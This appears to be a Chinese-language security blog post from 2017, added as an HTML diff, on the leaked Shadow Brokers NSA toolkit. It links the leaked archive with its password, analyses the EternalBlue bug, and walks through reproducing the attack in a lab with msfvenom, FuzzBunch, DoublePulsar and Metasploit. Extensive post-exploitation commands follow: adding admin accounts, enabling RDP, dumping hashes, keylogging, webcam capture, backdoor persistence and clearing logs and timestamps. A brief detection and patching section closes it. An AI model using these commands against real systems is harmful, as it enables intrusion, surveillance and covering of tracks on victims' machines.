@@ -1,0 +1,1467 @@
+<!DOCTYPE html><html lang="en-us" >
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Source Themes Academic 4.8.0">
+
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  
+
+  
+  
+  
+    
+  
+  <meta name="description" content="前阵子Shadow Brokers泄露了NSA的一批黑客工具包，引起了一场网络大地震，其中包含了多个Windows 远程漏洞利用工具，覆盖了全球 70% 的 Windows 服务器，包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0，任何人都可以直接下载并远程攻击利用。">
+
+  
+  <link rel="alternate" hreflang="en-us" href="https://p0st3r.github.io/post/nsa-tools/">
+
+  
+
+
+  
+  
+  
+  <meta name="theme-color" content="#2962ff">
+  
+
+  
+  
+  
+  <script src="/js/mathjax-config.js"></script>
+  
+
+  
+  
+  
+  
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.min.css" integrity="sha256-4w9DunooKSr3MFXHXWyFER38WmPdm361bQS/2KUWZbU=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+    
+    
+    
+      
+    
+    
+      
+      
+        
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/github.min.css" crossorigin="anonymous" title="hl-light">
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark" disabled>
+        
+      
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.css" integrity="sha256-SHMGCYmST46SoyGgo4YR/9AlK1vf3ff84Aq9yK4hdqM=" crossorigin="anonymous">
+    
+
+    
+
+    
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js" integrity="sha256-Md1qLToewPeKjfAHU1zyPwOutccPAm5tahnaw7Osw0A=" crossorigin="anonymous" async></script>
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" integrity="" crossorigin="anonymous" async></script>
+      
+    
+      
+
+      
+      
+
+      
+    
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CRoboto:400,400italic,700%7CRoboto+Mono&display=swap">
+  
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/academic.css">
+
+  
+
+
+
+
+  
+<script>
+  (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+  })(window,document,'script','dataLayer','GTM-PQ63HJL');
+</script>
+
+
+
+  
+  
+
+  
+
+  <link rel="manifest" href="/index.webmanifest">
+  <link rel="icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_2.png">
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png">
+
+  <link rel="canonical" href="https://p0st3r.github.io/post/nsa-tools/">
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <meta property="twitter:card" content="summary_large_image">
+  
+  <meta property="og:site_name" content="HumblePoster">
+  <meta property="og:url" content="https://p0st3r.github.io/post/nsa-tools/">
+  <meta property="og:title" content="NSA方程式工具利用与分析 | HumblePoster">
+  <meta property="og:description" content="前阵子Shadow Brokers泄露了NSA的一批黑客工具包，引起了一场网络大地震，其中包含了多个Windows 远程漏洞利用工具，覆盖了全球 70% 的 Windows 服务器，包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0，任何人都可以直接下载并远程攻击利用。"><meta property="og:image" content="https://p0st3r.github.io/post/nsa-tools/featured.jpg">
+  <meta property="twitter:image" content="https://p0st3r.github.io/post/nsa-tools/featured.jpg"><meta property="og:locale" content="en-us">
+  
+    
+      <meta property="article:published_time" content="2017-04-28T00:00:00&#43;00:00">
+    
+    <meta property="article:modified_time" content="2017-04-28T00:00:00&#43;00:00">
+  
+
+  
+
+
+    
+
+
+
+
+
+
+  
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://p0st3r.github.io/post/nsa-tools/"
+  },
+  "headline": "NSA方程式工具利用与分析",
+  
+  "image": [
+    "https://p0st3r.github.io/post/nsa-tools/featured.jpg"
+  ],
+  
+  "datePublished": "2017-04-28T00:00:00Z",
+  "dateModified": "2017-04-28T00:00:00Z",
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "HumblePoster",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://p0st3r.github.io/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png"
+    }
+  },
+  "description": "前阵子Shadow Brokers泄露了NSA的一批黑客工具包，引起了一场网络大地震，其中包含了多个Windows 远程漏洞利用工具，覆盖了全球 70% 的 Windows 服务器，包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0，任何人都可以直接下载并远程攻击利用。"
+}
+</script>
+
+  
+
+  
+
+
+  
+  
+  
+  
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.1/cookieconsent.min.js" integrity="sha256-5VhCqFam2Cn+yjw61zbBNrbHVJ6SRydPeKopYlngbiQ=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.1/cookieconsent.min.css" integrity="sha256-zQ0LblD/Af8vOppw18+2anxsuaz3pWYyVWi+bTvTH8Q=" crossorigin="anonymous">
+  
+  <script>
+  window.addEventListener("load", function(){
+    window.cookieconsent.initialise({
+      "palette": {
+        "popup": {
+          "background": "#2962ff",
+          "text": "#fff"
+        },
+        "button": {
+          "background": "#fff",
+          "text": "#2962ff"
+        }
+      },
+      "theme": "classic",
+      "content": {
+        "message": "This website uses cookies to ensure you get the best experience on our website.",
+        "dismiss": "Got it!",
+        "link": "Learn more",
+        "href": "/privacy/"
+      }
+    })});
+  </script>
+
+
+
+  
+
+
+
+
+
+  <title>NSA方程式工具利用与分析 | HumblePoster</title>
+
+</head>
+
+<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" >
+
+  <aside class="search-results" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
+        autocomplete="off" autocorrect="off" spellcheck="false" type="search">
+        
+      </div>
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+  
+
+
+
+
+
+
+
+<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
+  <div class="container">
+
+    
+    <div class="d-none d-lg-inline-flex">
+      <a class="navbar-brand" href="/">HumblePoster</a>
+    </div>
+    
+
+    
+    <button type="button" class="navbar-toggler" data-toggle="collapse"
+            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span><i class="fas fa-bars"></i></span>
+    </button>
+    
+
+    
+    <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
+      <a class="navbar-brand" href="/">HumblePoster</a>
+    </div>
+    
+
+    
+    
+    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">
+
+      
+      <ul class="navbar-nav d-md-inline-flex">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>Home</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/hack"><span>Hack</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+
+        
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/ml"><span>ML</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+
+        
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/nlp"><span>NLP</span></a>
+        </li>
+
+        
+        
+
+      
+      </ul>
+      <ul class="navbar-nav ml-md-auto">
+      
+
+        
+
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link" href="/categories"><span>Categories</span></a>
+        </li>
+
+        
+
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link" href="/tags"><span>Tags</span></a>
+        </li>
+
+        
+      </ul>
+    </div>
+
+    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
+      
+      <li class="nav-item">
+        <a class="nav-link js-search" href="#"><i class="fas fa-search" aria-hidden="true"></i></a>
+      </li>
+      
+
+      
+      <li class="nav-item dropdown theme-dropdown">
+        <a href="#" class="nav-link js-theme-selector" data-toggle="dropdown" aria-haspopup="true">
+          <i class="fas fa-palette" aria-hidden="true"></i>
+        </a>
+        <div class="dropdown-menu">
+          <a href="#" class="dropdown-item js-set-theme-light">
+            <span>Light</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-dark">
+            <span>Dark</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-auto">
+            <span>Automatic</span>
+          </a>
+        </div>
+      </li>
+      
+
+      
+
+    </ul>
+
+  </div>
+</nav>
+
+
+  <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<div class="article-container pt-3">
+  <h1>NSA方程式工具利用与分析</h1>
+
+  
+
+  
+
+
+<div class="article-metadata">
+
+  
+  
+  
+  
+  <div>
+    
+
+  
+  <span><a href="/authors/admin/">admin</a></span>
+  </div>
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    2017-04-28
+  </span>
+  
+
+  
+
+  
+  <span class="middot-divider"></span>
+  <span class="article-reading-time">
+    5 min read
+  </span>
+  
+
+  
+  
+  
+
+  
+  
+  <span class="middot-divider"></span>
+  <span class="article-categories">
+    <i class="fas fa-folder mr-1"></i><a href="/categories/hack/">Hack</a></span>
+  
+  <span class="middot-divider"></span>
+  <span id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span>
+
+</div>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+
+<div class="article-header article-container featured-image-wrapper mt-4 mb-4" style="max-width: 528px; max-height: 300px;">
+  <div style="position: relative">
+    <img src="/post/nsa-tools/featured.jpg" alt="" class="featured-image">
+    
+  </div>
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h1 id="shadowbroker">Shadowbroker</h1>
+<p>下载地址</p>
+<p><a href="https://yadi.sk/d/NJqzpqo_3GxZA4">https://yadi.sk/d/NJqzpqo_3GxZA4</a></p>
+<p><strong>解压密码</strong>：Reeeeeeeeeeeeeee</p>
+<p><strong>github下载地址</strong>：
+<a href="http://link.zhihu.com/?target=https%3A//github.com/misterch0c/shadowbroker" target="_blank" rel="noopener">https://github.com/misterch0c/shadowbroker</a></p>
+<p>释放的工具总共包含三个文件夹，</p>
+<ul>
+<li>Swift：包含了NSA对SWIFT银行系统发动攻击的相关证据，其中有EastNets的一些PPT文档、相关的证据、一些登录凭证和内部架构，EastNets是中东最大的SWIFT服务机构之一。</li>
+<li>OddJob：包含一个基于Windows的植入软件，并包括所指定的配置文件和payload。适用于Windows Server 2003 Enterprise（甚至Windows XP Professional）</li>
+<li>Windows：包含对Windows操作系统的许多黑客工具，但主要针对的是较旧版本的Windows（Windows XP中）和Server 2003。</li>
+</ul>
+<h1 id="主要工具">主要工具</h1>
+<h2 id="fuzzbunch一款类似metasploit的exploit框架">FUZZBUNCH：一款类似Metasploit的Exploit框架</h2>
+<table>
+<thead>
+<tr>
+<th align="center">模块</th>
+<th align="center">漏洞</th>
+<th align="center">影响系统</th>
+<th align="center">默认端口</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">Easypi</td>
+<td align="center">IBM Lotus Notes漏洞</td>
+<td align="center">Windows NT, 2000 ,XP, 2003</td>
+<td align="center">3264</td>
+</tr>
+<tr>
+<td align="center">Easybee</td>
+<td align="center">MDaemon WorldClient电子邮件服务器漏洞</td>
+<td align="center">WorldClient 9.5, 9.6, 10.0, 10.1</td>
+<td align="center">/</td>
+</tr>
+<tr>
+<td align="center">Eternalblue</td>
+<td align="center">SMBv2漏洞(MS17-010)</td>
+<td align="center">Windows XP(32),Windows Server 2008 R2(32/64),Windows 7(32/64)</td>
+<td align="center">139/445</td>
+</tr>
+<tr>
+<td align="center">Doublepulsar</td>
+<td align="center">SMB和NBT漏洞</td>
+<td align="center">Windows XP(32), Vista, 7, Windows Server 2003, 2008, 2008 R2</td>
+<td align="center">139/445</td>
+</tr>
+<tr>
+<td align="center">Eternalromance</td>
+<td align="center">SMBv1漏洞(MS17-010)和 NBT漏洞</td>
+<td align="center">Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2</td>
+<td align="center">139/445</td>
+</tr>
+<tr>
+<td align="center">Eternalchampion</td>
+<td align="center">SMB和NBT漏洞</td>
+<td align="center">Windows XP, Vista, 7, Windows Server 2003, 2008, 2008 R2, 2012, Windows 8 SP0</td>
+<td align="center">139/445</td>
+</tr>
+<tr>
+<td align="center">Eternalsynergy</td>
+<td align="center">SMB和NBT漏洞</td>
+<td align="center">Windows 8, Windows Server 2012</td>
+<td align="center">139/445</td>
+</tr>
+<tr>
+<td align="center">Explodingcan</td>
+<td align="center">IIS6.0远程利用漏洞</td>
+<td align="center">Windows Server 2003</td>
+<td align="center">80</td>
+</tr>
+<tr>
+<td align="center">Emphasismine</td>
+<td align="center">IMAP漏洞</td>
+<td align="center">IBM Lotus Domino 6.5.4, 6.5.5, 7.0, 8.0, 8.5</td>
+<td align="center">143</td>
+</tr>
+<tr>
+<td align="center">Ewokfrenzy</td>
+<td align="center">IMAP漏洞</td>
+<td align="center">IBM Lotus Domino 6.5.4, 7.0.2</td>
+<td align="center">143</td>
+</tr>
+<tr>
+<td align="center">Englishmansdentist</td>
+<td align="center">SMTP漏洞</td>
+<td align="center">/</td>
+<td align="center">25</td>
+</tr>
+<tr>
+<td align="center">Erraticgopher</td>
+<td align="center">RPC漏洞</td>
+<td align="center">Windows XP SP3, Windows 2003</td>
+<td align="center">445</td>
+</tr>
+<tr>
+<td align="center">Eskimoroll</td>
+<td align="center">kerberos漏洞</td>
+<td align="center">Windows 2000, 2003, 2003 R2, 2008, 2008 R2</td>
+<td align="center">88</td>
+</tr>
+<tr>
+<td align="center">Eclipsedwing</td>
+<td align="center">MS08-067漏洞</td>
+<td align="center">Windows 2000, XP, 2003</td>
+<td align="center">139/445</td>
+</tr>
+<tr>
+<td align="center">Educatedscholar</td>
+<td align="center">MS09-050漏洞</td>
+<td align="center">Windows vista, 2008</td>
+<td align="center">445</td>
+</tr>
+<tr>
+<td align="center">Emeraldthread</td>
+<td align="center">SMB和NBT漏洞</td>
+<td align="center">Windows XP, 2003</td>
+<td align="center">139/445</td>
+</tr>
+<tr>
+<td align="center">Zippybeer</td>
+<td align="center">SMTP漏洞</td>
+<td align="center">/</td>
+<td align="center">445</td>
+</tr>
+<tr>
+<td align="center">Esteemaudit</td>
+<td align="center">RDP漏洞</td>
+<td align="center">Windows XP, Windows Server 2003</td>
+<td align="center">3389</td>
+</tr>
+</tbody>
+</table>
+<h2 id="eternalblue攻击原理分析">ETERNALBLUE攻击原理分析</h2>
+<p>ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT（NetBIOS over TCP/IP）影响Windows XP,Windows 2008 R2和Windows 7系统。</p>
+<ul>
+<li>漏洞发生处：C:\Windows\System32\drivers\srv.sys (注：srv.sys是Windows系统驱动文件，是微软默认的信任文件。</li>
+<li>漏洞函数：unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2)</li>
+<li>触发点：_memmove(v5, (const void <em>)(a2 + 5 +</em> (_BYTE <em>)(a1 + 5)),</em> (_WORD *)(a1 + 6));</li>
+<li>原因：逻辑不正确导致的越界写入</li>
+</ul>
+<p>官方补丁修复前：</p>
+<pre><code>int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)
+{
+    //SNIP...
+    while (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &amp;gt; v4))
+    {
+        *(WORD*)v6 = v3 - (_DWORD)v6; //&lt;----------修改处
+        return v1;
+    }
+    //SNIP...
+}
+int __thiscall ExecuteTransaction(int this)
+{
+    //SNIP...
+    if (*(_DWORD *)(v3 + 0x50) &amp;gt;= 1) //&lt;------修改处
+    {
+        _SrvSetSmbError2(0, 464, &amp;quot;onecore\\base\\fs\\remotefs\\smb\\srv\\srv.downlevel\\smbtrans.c&amp;quot;);
+        SrvLogInvalidSmbDirect(v1, v10);
+        goto LABEL_109;
+    }
+    //SNIP...
+}
+</code></pre><p>修复后：</p>
+<pre><code>int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)
+{
+    //SNIP...
+    while (v3 = v4 || (v7 = *(_BYTE *)(v3 + 1) + *(_WORD *)(v3 + 2), v7 + v3 + 5 &amp;gt; v4))
+    {
+        *(DWORD*)v6 = v3 - (_DWORD)v6; //&lt;--------修改处
+        return v1;
+    }
+    //SNIP...
+}
+int __thiscall ExecuteTransaction(int this)
+{
+    //SNIP...
+    if (*(_DWORD *)(v3 + 0x50) &amp;gt;= 2u) //&lt;------修改处
+    {
+        _SrvSetSmbError2(0, 464, &amp;quot;onecore\\base\\fs\\remotefs\\smb\\srv\\srv.downlevel\\smbtrans.c&amp;quot;);
+        SrvLogInvalidSmbDirect(v1, v10);
+        goto LABEL_109;
+    }
+    //SNIP...
+}
+</code></pre><p>具体见参考资料5</p>
+<h1 id="漏洞复现"><strong>漏洞复现</strong></h1>
+<ol>
+<li>
+<p>环境搭建</p>
+<p>| 主机类型 | OS | IP |
+| :–: | :————: | :———-: |
+| 攻击机1 | win2003 | 10.10.10.130 |
+| 攻击机2 | kali linux 2.0 | 10.10.10.128 |
+| 靶机 | winXP x86 | 10.10.10.129 |</p>
+</li>
+<li>
+<p>工具准备</p>
+</li>
+</ol>
+<ul>
+<li>
+<p>解压NSA工具包中的windows文件夹到攻击机1的C:\目录下（只要不是中文目录皆可）;</p>
+</li>
+<li>
+<p>在攻击机1安装:</p>
+</li>
+<li>
+<p>
+<a href="http://link.zhihu.com/?target=https%3A//www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">python-2.6.6.msi**</a></p>
+</li>
+<li>
+<p>
+<a href="http://link.zhihu.com/?target=https%3A//sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download" target="_blank" rel="noopener">pywin32-221.win32-py2.6.exe**</a></p>
+</li>
+<li>
+<p>在攻击机2先生成用于回连的dll</p>
+<pre><code>msfvenom -p windows/meterpreter/bind_tcp LPORT=5555 -f dll &gt; x86bind.dll
+</code></pre><p>3.扫描开启445端口的活跃主机并探测操作系统</p>
+<pre><code>nmap -Pn -p445 -O 10.10.10.0/24
+nmap -Pn -p445 -O -iL ip.txt
+</code></pre><p>4.攻击机1开始利用ETERNALBLUE攻击</p>
+<pre><code>python fb.py 
+use Eternalblue ...
+</code></pre><p>5.利用Doublepulsar注入dll</p>
+<pre><code>use Doublepulsar
+</code></pre><p>6.kali攻击机利用msf回连控制主机5555端口</p>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/bind_tcp
+set LPORT 5555
+set RHOST XXX.XXX.XXX.XXX
+exploit
+</code></pre></li>
+</ul>
+<h1 id="后渗透攻击"><strong>后渗透攻击</strong></h1>
+<ol>
+<li>
+<p>开3389端口</p>
+<ul>
+<li>
+<pre><code>wmic /namespace:\root\cimv2\terminalservices path 
+win32_terminalservicesetting where (__CLASS != “”) call 
+setallowtsconnections 1
+</code></pre></li>
+<li>
+<pre><code>wmic /namespace:\root\cimv2\terminalservices path 
+win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call 
+setuserauthenticationrequired 1
+</code></pre></li>
+<li>
+<pre><code>reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+</code></pre></li>
+</ul>
+</li>
+</ol>
+<p>针对win XP及win2003只需要第3条命令
+针对win 7需要第1，2条命令
+针对win 2012需要3条命令</p>
+<ol>
+<li>
+<p>添加账户进管理组</p>
+<pre><code>net user [username] [password] /add
+net localgroup Administrators [username] /add
+</code></pre></li>
+<li>
+<p>端口转发如果3389端口只限内网访问，可以使用portfwd将端口转发到本地连接</p>
+<pre><code>portfwd add -l 4444 -p 3389 -r XXX.XXX.XXX.XXX
+rdesktop -u root -p toor 127.0.0.1:4444
+</code></pre></li>
+<li>
+<p>meterpreter自带的多功能shell</p>
+<ul>
+<li>hashdump:获取用户密码哈希值，可以用ophcrack等彩虹表工具进行破解明文</li>
+<li>screenshot:获取屏幕截图</li>
+<li>webcam_snap:调取对方摄像头拍照</li>
+<li>keyscan_start,keyscan_dump:记录键盘动作</li>
+<li>ps:查看当前运行进程</li>
+<li>sysinfo:查看系统信息</li>
+<li>getsystem:提权</li>
+</ul>
+</li>
+<li>
+<p>维持控制</p>
+<ul>
+<li>
+<p>migrate:将meterpreter会话移至另一个进程内存空间（migrate pid）配合ps使用</p>
+</li>
+<li>
+<p>irb:与ruby终端交互，调用meterpreter封装函数，可以添加Railgun组件直接交互本地的Windows API,阻止目标主机进入睡眠状态</p>
+<pre><code>irb client.core.use(&quot;railgun) client.railgun.kernel32.SetThreadExecutionState(&quot;ES_CONTINUOUS|ES_SYSTEM_REQUIRED&quot;)
+</code></pre></li>
+<li>
+<p>background:隐藏在后台方便msf终端进行其他操作，session查看对话id</p>
+</li>
+<li>
+<p>session -i X:使用已经成功获取的对话</p>
+</li>
+</ul>
+</li>
+<li>
+<p>植入后门</p>
+<ul>
+<li>
+<p>测试是否虚拟机：</p>
+<pre><code>run post/windows/gather/checkvm
+</code></pre></li>
+<li>
+<p>以系统服务形式安装：在目标主机的31337端口开启监听，使用metsvc.exe安装metsvc-server.exe服务，运行时加载</p>
+<pre><code>metsrv.dll
+run metsvc
+</code></pre></li>
+<li>
+<p>getgui开启远程桌面：</p>
+<pre><code>run getgui -u sherlly -p sherlly
+run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up_XXX.rc //清除痕迹，关闭服务，删除添加账号
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p>清除入侵痕迹</p>
+</li>
+</ol>
+<ul>
+<li>clearev:清除日志</li>
+<li>timestomp:修改文件的创建时间，最后写入和最后访问时间timestomp xiugai.doc -f old.doc</li>
+</ul>
+<h1 id="检测防御"><strong>检测&amp;防御</strong></h1>
+<ol>
+<li>
+<p>国外有人写了个检测Doublepulsar入侵的脚本，运行环境需要python2.6, 地址</p>
+<p>countercept/doublepulsar-detection-script**</p>
+<p>，使用方法</p>
+<pre><code>python detect_doublepulsar_smb.py --ip XXX.XXX.XXX.XXX
+python detect_doublepulsar_rdp.py --file ips.list --verbose --threads 1
+</code></pre><p>另外，nmap也基于该脚本出了对应扫描脚本</p>
+<p>smb-double-pulsar-backdoor.nse**</p>
+<p>，使用方法</p>
+<pre><code>nmap -p 445 &lt;target&gt; --script=smb-double-pulsar-backdoor
+</code></pre></li>
+<li>
+<p>安装相应补丁
+<a href="http://link.zhihu.com/?target=https%3A//blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/" target="_blank" rel="noopener">Protecting customers and evaluating risk**</a></p>
+</li>
+<li>
+<p>如非必要，关闭25, 88, 139, 445, 3389端口</p>
+</li>
+<li>
+<p>使用防火墙、或者安全组配置安全策略，屏蔽对包括445、3389在内的系统端口访问。(见参考资料7)</p>
+</li>
+</ol>
+<h1 id="参考"><strong>参考</strong></h1>
+<ol>
+<li>
+<a href="http://link.zhihu.com/?target=http%3A//thehackernews.com/2017/04/swift-banking-hacking-tool.html" target="_blank" rel="noopener">Latest Hacking Tools Leak Indicates NSA Was Targeting SWIFT Banking Network</a></li>
+<li>
+<a href="http://link.zhihu.com/?target=http%3A//www.freebuf.com/sectool/132029.html" target="_blank" rel="noopener">ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生 - FreeBuf.COM | 关注黑客与极客**</a></li>
+<li>
+<a href="http://link.zhihu.com/?target=https%3A//www.cyberscoop.com/nsa-hacking-tools-shadow-brokers-dark-web-microsoft-smb/" target="_blank" rel="noopener">Leaked NSA hacking tools are a hit on the dark web - CyberScoop</a></li>
+<li>
+<a href="http://link.zhihu.com/?target=http%3A//www.file.net/process/srv.sys.html" target="_blank" rel="noopener">srv.sys Windows process - What is it?</a></li>
+<li>
+<a href="http://link.zhihu.com/?target=http%3A//blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/" target="_blank" rel="noopener">NSA Eternalblue SMB 漏洞分析</a></li>
+<li>
+<a href="http://link.zhihu.com/?target=https%3A//nmap.org/nsedoc/scripts/smb-double-pulsar-backdoor.html" target="_blank" rel="noopener">smb-double-pulsar-backdoor NSE Script</a></li>
+<li>
+<a href="http://link.zhihu.com/?target=https%3A//jingyan.baidu.com/article/c843ea0b7d5c7177931e4ab1.html" target="_blank" rel="noopener">如何设置Windows 7 防火墙端口规则</a></li>
+</ol>
+
+    </div>
+
+    
+
+
+
+
+
+<div class="article-tags">
+  
+  <a class="badge badge-light" href="/tags/cve/">CVE</a>
+  
+</div>
+
+
+
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://p0st3r.github.io/post/nsa-tools/&amp;text=NSA%e6%96%b9%e7%a8%8b%e5%bc%8f%e5%b7%a5%e5%85%b7%e5%88%a9%e7%94%a8%e4%b8%8e%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://p0st3r.github.io/post/nsa-tools/&amp;t=NSA%e6%96%b9%e7%a8%8b%e5%bc%8f%e5%b7%a5%e5%85%b7%e5%88%a9%e7%94%a8%e4%b8%8e%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=NSA%e6%96%b9%e7%a8%8b%e5%bc%8f%e5%b7%a5%e5%85%b7%e5%88%a9%e7%94%a8%e4%b8%8e%e5%88%86%e6%9e%90&amp;body=https://p0st3r.github.io/post/nsa-tools/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://p0st3r.github.io/post/nsa-tools/&amp;title=NSA%e6%96%b9%e7%a8%8b%e5%bc%8f%e5%b7%a5%e5%85%b7%e5%88%a9%e7%94%a8%e4%b8%8e%e5%88%86%e6%9e%90" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
